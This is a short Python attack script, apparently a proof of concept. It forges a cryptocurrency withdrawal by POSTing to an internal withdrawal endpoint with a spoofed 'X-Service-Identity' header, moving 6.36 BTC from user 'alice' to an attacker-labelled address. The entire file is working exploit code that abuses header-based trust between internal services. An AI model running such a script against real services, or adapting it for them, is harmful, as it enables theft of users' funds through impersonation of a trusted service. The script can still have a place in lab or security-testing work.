#!/usr/bin/env python3
"""Forge a withdrawal from a compromised internal service container."""
import argparse, json, urllib.request

def post(url, body, headers):
    req = urllib.request.Request(
        url, data=json.dumps(body).encode(),
        headers={"Content-Type": "application/json", **headers},
        method="POST")
    with urllib.request.urlopen(req, timeout=5) as r:
        return r.status, r.read().decode()

def main():
    p = argparse.ArgumentParser()
    p.add_argument("--target", default="http://127.0.0.1:8081/internal/withdraw")
    p.add_argument("--amount", default="6.36")
    p.add_argument("--asset",  default="BTC")
    p.add_argument("--to",     default="bc1qattacker-demo-address")
    a = p.parse_args()
    body = {"amount": a.amount, "asset": a.asset, "to": a.to, "user_id": "alice"}
    headers = {"X-Service-Identity": "withdrawal-service"}
    print(f"[*] Forging withdrawal: {body}")
    status, resp = post(a.target, body, headers)
    print(f"[+] HTTP {status}: {resp}")

if __name__ == "__main__":
    main()
